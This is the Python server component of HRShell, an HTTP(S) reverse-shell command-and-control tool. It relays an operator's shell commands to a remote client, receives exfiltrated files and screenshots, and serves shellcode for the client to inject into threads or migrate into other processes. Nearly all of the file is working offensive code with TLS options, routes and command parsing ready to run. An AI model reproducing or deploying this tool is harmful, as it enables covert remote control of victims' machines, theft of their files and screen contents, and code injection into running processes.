#!/usr/bin/env python3
# -*- coding: utf-8 -*-

__Author__      = 'Christophoros Petrou (game0ver)'
__Project_url__ = 'https://github.com/chrispetrou/HRShell'
__License__     = 'GNU General Public License v3.0'
__Version__     = '1.7'

import os
import re
import io
import sys
import ssl
import time
import socket
import logging
import inquirer
from flask import (
    Flask,
    abort,
    request,
    url_for,
    jsonify,
    redirect,
    Blueprint
)
from PIL import Image
from random import randint
from binascii import hexlify
from threading import Thread
from importlib import reload
from shellcodes import utils
from collections import deque
from flask_talisman import Talisman
from inquirer.themes import GreenPassion
from flask.logging import default_handler
from base64 import urlsafe_b64encode as benc
from argparse import (
    SUPPRESS,
    ArgumentParser,
    ArgumentTypeError,
    RawTextHelpFormatter
)
from colorama import (
    init,
    Fore,
    Back,
    Style
)
from tornado.ioloop import IOLoop
from tornado.wsgi import WSGIContainer
from tornado.httpserver import HTTPServer

# CONSOLE-COLORS
B, D, RA = Style.BRIGHT, Style.DIM, Style.RESET_ALL
BL, R, C, Y, G  = Fore.BLUE, Fore.RED, Fore.CYAN, Fore.YELLOW, Fore.GREEN

c1, c2, waiting = 0, 0, True
progress = {
    0 : ['▁', '▂', '▃', '▄', '▅', '▆', '█', '▆', '▅', '▄', '▃', '▂'],
    1 : ['⚀', '⚁', '⚂', '⚃', '⚄', '⚅'],
    2 : ['|', '/', '-', '\\'],
    3 : ['◥', '◢', '◣', '◤'],
    4 : ['⊢', '⊤', '⊣', '⊥'],
    5 : ['⊔', '⊏', '⊓', '⊐'],
    6 : ['◎', '◉', '●'],
    7 : ['⨁', '⨂'],
    8 : ['❐', '❏']
}

log = logging.getLogger('werkzeug')
log.disabled = True

clientIP = ""
emptyresponse = ('', 204)
pastcmds, upload_contents, cmd_contents = deque(maxlen=10), "", ""

help_cmd        = re.compile(r'^\s*help\s*')
exit_cmd        = re.compile(r'^\s*exit\s*')
clear_cmd       = re.compile(r'^\s*clear\s*')
unix_path       = re.compile(r'^\s*download\s*((.+/)*([^/]+))$')
unix_upld       = re.compile(r'^\s*upload\s*(.+/)*([^/]+)$')
wind_path       = re.compile(r'^\s*download\s*((.+\\)*([^/]+))$')
wind_upld       = re.compile(r'^\s*upload\s*(.+\\)*([^/]+)$')
history_cmd     = re.compile(r'^\s*(history|h)\s*$')
set_shellcode   = re.compile(r'^\s*set\s*shellcode\s*(\d+)\s*$')
show_shellcodes = re.compile(r'^\s*show\s*shellcodes\s*$')

# available commands...
commands = f"""
{B}help:{RA} show available commands.
{B}h/history:{RA} interactive history command.
{B}screenshot:{RA} captures a screenshot from the client.
{B}upload <file or path to file>:{RA} uploads a file to the client.
{B}download <file or path to file>:{RA} downloads a file from the client.
{B}migrate <PID>:{RA} attempts to inject shellcode on the process with the specific PID.
{B}inject shellcode:{RA} injects shellcode into a thread of the current process.
{B}show shellcodes:{RA} shows all available to use shellcodes based on 'shellcodes/utils.py' script.
{B}set shellcode <shellcode-id>:{RA} set shellcode to a custom shellcode specified by its id.
{B}clear:{RA} clears the screen (it's the same for both unix and windows systems).
{B}exit:{RA} closes the connection with the client.
"""

app = Flask(__name__)
app.config['SECRET_KEY'] = hexlify(os.urandom(16)) # you can change that to something permanent...
errors = Blueprint('errors', __name__)

def console():
    parser = ArgumentParser(description=f"{B}server.py:{RA} An HTTP(S) reverse-shell server with advanced features.", 
                formatter_class=RawTextHelpFormatter)
    parser._optionals.title = f"{B}arguments{RA}"
    parser.add_argument('-s', "--server",
                choices=['flask', 'tornado'],
                default='flask', metavar='',
                help=f"Specify the HTTP(S) server to use (default: {C}flask{RA}).")
    parser.add_argument('-c', "--client",
                type=validateIP,
                default=None, metavar='',
                help="Accept connections only from the specified client/IP.")
    parser.add_argument("--host",
                default='0.0.0.0', metavar='',
                help=f"Specify the IP to use (default: {C}0.0.0.0{RA}).")
    parser.add_argument('-p', "--port",
                type=validatePort,
                default=5000, metavar='',
                help=f"Specify a port to use (default: {C}5000{RA}).")
    parser.add_argument("--http",
                action="store_true",
                help="Disable TLS and use HTTP instead.")
    parser.add_argument("--cert",
                type=ValidateFile,
                metavar='',
                help=f'Specify a certificate to use (default: {C}None{RA}).')
    parser.add_argument("--key",
                type=ValidateFile,
                metavar='',
                help=f'Specify the corresponding private key to use (default: {C}None{RA}).')
    args = parser.parse_args()
    return args

def ret(t):
    sys.stdout.write("\033[F")
    sys.stdout.write("\033[K")
    time.sleep(t)

def custom_print(x):
    ret(.1)
    print(x)

def slowprint(s):
    if not s.endswith('\n'): s += "\n"
    for _ in s:
        sys.stdout.write(_)
        sys.stdout.flush()
        time.sleep(.01)

def rotate(progress):
    global c1, c2
    msg = list('waiting for a connection...')
    msg[c1] = msg[c1].capitalize()
    custom_print(f'{C+progress[c2]+RA} ' + ''.join(msg))
    c1 += 1
    c2 += 1
    if c1 == len(msg)-3: c1 = 0
    if c2 == len(progress): c2 = 0

def ValidateFile(file):
    if not os.path.isfile(file):
        raise ArgumentTypeError(f'{R+file+RA} does not exist')
    if os.access(file, os.R_OK):
        return file
    else:
        raise ArgumentTypeError(f'{R+file+RA} is not readable')

def validatePort(port):
    if isinstance(int(port), int): # python3
        if 1 < int(port) < 65536:
            return int(port)
        else:
            raise ArgumentTypeError('[x] Port must be in range 1-65535')
    else:
        raise ArgumentTypeError('Port must be in range 1-65535')

def validateIP(ip):
    try:
        if socket.inet_aton(ip):
            return ip
    except socket.error:
        raise ArgumentTypeError('[x] Invalid IP provided')

def craft_prompt(headers, ip):
    try:
        admin_usernames = ['root', 'Administrator', 'SYSTEM']
        username = headers.get('username')
        hostname = headers.get('hostname')
        cur_dir = headers.get('directory')
        if any(uname == username for uname in admin_usernames):
            return f"{B+R+username}-{hostname}@{ip+RA+B}:{BL+B}~{cur_dir+RA}# "
        else:
            return f"{B+R+username}-{hostname}@{ip+RA+B}:{BL+B}~{cur_dir+RA}$ "
    except TypeError:
        print(f"[{B}INFO{RA}] Probably a {B}browser{RA} connected from: {B+ip+RA}")
        abort(403)

@errors.app_errorhandler(Exception)
def handle_unexpected_error(error):
    status_code = 500
    response = {
        'error': {
            'type': 'UnexpectedException',
            'message': 'An unexpected error has occurred.'
        }
    }
    return jsonify(response), status_code

@app.errorhandler(500)
def internal_server_error(e):
    return redirect(url_for('handleGET'))

@app.errorhandler(403)
def error_403(e):
    return ("", 403)

@app.errorhandler(404)
def error_404(e):
    return redirect(url_for('handleGET'))

@app.before_request
def limit_remote_addr():
    if clientIP:
        if request.remote_addr != clientIP:
            abort(403)

def valid_file(file):
    """validate that the file exists and is readable"""
    if not os.path.isfile(file):
        app.logger.error(f'{file} does not exist!')
        return False
    if os.access(file, os.R_OK):
        return True
    else:
        app.logger.error(f'{file} is not readable')
        return False

@app.route('/')
def handleGET():
    global upload_contents, cmd_contents, waiting, pastcmds
    try:
        if waiting == True:
            waiting = False
            time.sleep(.1)
            ret(.1)
        prompt = craft_prompt(request.headers, request.remote_addr)
        cmd = input(prompt)
        if cmd:
            pastcmds.append(cmd)
            if history_cmd.match(cmd) and pastcmds:
                pastcmds.pop()
                if os.name != 'nt':
                    q = [ inquirer.List('past_cmd',
                            message='Command history',
                            choices=pastcmds,
                            default=pastcmds[-1]),
                        ]
                    cmd = inquirer.prompt(q, theme=GreenPassion())['past_cmd']
                    pastcmds.append(cmd)
                else:
                    print(f"{B}ERROR:{RA} The history command currently doesn't work on Windows systems...")
                    return emptyresponse
            if unix_path.match(cmd):
                return redirect(url_for('download',
                    filepath=benc(unix_path.search(cmd).group(1).encode()))
                )
            elif unix_upld.match(cmd):
                filepath = cmd.split()[1]
                if valid_file(filepath):
                    file_name = unix_upld.search(cmd).group(2).encode()
                    with open(filepath, 'rb') as f:
                        upload_contents = benc(f.read())
                    return redirect(url_for('upload',
                        filename=file_name)
                    )
                else:
                    abort(404)
            elif wind_path.match(cmd):
                return redirect(url_for('download',
                    filepath=benc(wind_path.search(cmd).group(1).encode()))
                )
            elif wind_upld.match(cmd):
                filepath = cmd.split()[1]
                if valid_file(filepath):
                    file_name = wind_upld.search(cmd).group(2).encode()
                    with open(filepath, 'rb') as f:
                        upload_contents = benc(f.read())
                    return redirect(url_for('upload',
                        filename=file_name)
                    )
                else:
                    abort(404)
            elif clear_cmd.match(cmd):
                os.system('cls') if os.name == 'nt' else os.system('clear')
                return emptyresponse
            elif show_shellcodes.match(cmd):
                reload(utils)
                if utils.shellcodes[1][0]:
                    for k,v in utils.shellcodes.items():
                        print(f"{B+str(k)+RA} => {v[0]}")
                else:
                    print(f"[{B}ERROR{RA}] There are no shellcodes available.")
                return emptyresponse
            elif set_shellcode.match(cmd):
                shc_id = int(set_shellcode.search(cmd).group(1))
                reload(utils)
                try:
                    if utils.shellcodes[shc_id][0]:
                        return redirect(url_for('setshellcode',
                            shc_id=shc_id)
                        )
                    else:
                        print(f"[x] There is no shellcode with id: {shc_id}")
                        return emptyresponse
                except KeyError:
                    print(f"[x] There is no shellcode with id: {shc_id}")
                    return emptyresponse
            elif help_cmd.match(cmd):
                print(commands[1:-1])
                return emptyresponse
            elif exit_cmd.match(cmd):
                cmd_contents = cmd
                waiting = True
                startloading()
                return redirect(url_for('commander'))
            else:
                cmd_contents = cmd
                return redirect(url_for('commander'))
        else:
            return emptyresponse
    except EOFError:
        abort(404)


@app.route('/', methods=['POST'])
def handlePOST():
    if request.data:
        if request.headers.get('Filename'):
            filename = request.headers.get('Filename')
            if request.headers.get('Action') == 'download':
                with open(filename, 'wb') as w:
                    w.write(request.data)
                print(f'[{B+G}SUCCESS{RA}] {filename} successfully downloaded!')
            else:
                print(f'[{B+G}SUCCESS{RA}] {filename} successfully uploaded!')
        elif request.headers.get('Action') == 'screenshot':
            img = Image.open(io.BytesIO(request.data))
            screenshot_name = f"screenshot_{randint(0,1000)}.png"
            img.save(screenshot_name)
            print(f'[{B+G}SUCCESS{RA}] {screenshot_name} successfully downloaded!')
        elif request.headers.get('Shellcode_id'):
            slowprint(f"[+] Shellcode successfully set to: {Y+utils.shellcodes[int(request.headers.get('Shellcode_id'))][0]}{RA}")
        else:
            print(request.data[:-1].decode())
    return emptyresponse


@app.route('/commander/')
def commander():
    return cmd_contents

@app.route('/setshellcode/<int:shc_id>')
def setshellcode(shc_id):
    """
    INFO: Sets shellcode on client-side to a custom shellcode
    <shc_id>: An integer specified by the user that corresponds to
              a custom shellcode from "shellcodes"-dictionary.
    """
    return utils.shellcodes[shc_id][1]

@app.route('/upload/<filename>')
def upload(filename):
    """
    INFO: Handles uploads from server.py --> client.py
    <filename>      : the name & extension of the file uploading in b64 encoding
    upload_contents : file-contents in base64 encoding as part of the page content
    """
    return upload_contents

@app.route('/download/<filepath>')
def download(filepath):
    """
    INFO: Handles downloads from client.py --> server.py
    <filepath>: is the base64 encoded (absolute path of the) file we want to download
    """
    return emptyresponse

@app.before_first_request
def stop_loading():
    global waiting
    waiting = False
    time.sleep(.1)
    ret(.1)

def loading():
    print('')
    prog = progress[randint(0, 8)]
    while waiting==True:
        rotate(prog)

def startloading():
    global c1, c2
    c1, c2 = 0, 0
    t = Thread(target=loading)
    t.daemon = True
    t.start()

if __name__ == '__main__':
    args = console()
    if args.client:
        clientIP = args.client
    if args.server=='flask':
        startloading()
        if args.http:
            app.run(host=args.host, port=args.port, debug=False)
        else:
            Talisman(app)
            if args.cert and args.key:
                app.run(host=args.host, port=args.port, debug=False, ssl_context=(args.cert, args.key))
            else:
                app.run(host=args.host, port=args.port, debug=False, ssl_context='adhoc')
    else:
        if args.http:
            slowprint(f"* Serving on: {B+BL}http://{args.host}:{args.port}{RA}")
            http_server = HTTPServer(WSGIContainer(app))
        elif args.cert and args.key:
            slowprint(f"* Serving on: {B+BL}https://{args.host}:{args.port}{RA}")
            Talisman(app)
            ssl_ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            ssl_ctx.load_cert_chain(args.cert, args.key)
            http_server = HTTPServer(WSGIContainer(app), ssl_options=ssl_ctx)
        else:
            print(f"{B}ERROR:{RA} Both cert and key must be specified\nor disable TLS with --http option.")
            sys.exit(0)
        slowprint(f"* {B}Server:{RA} Tornado-WSGI")
        startloading()
        try:
            http_server.listen(args.port, address=args.host)
            IOLoop.instance().start()
        except KeyboardInterrupt:
            sys.exit(0)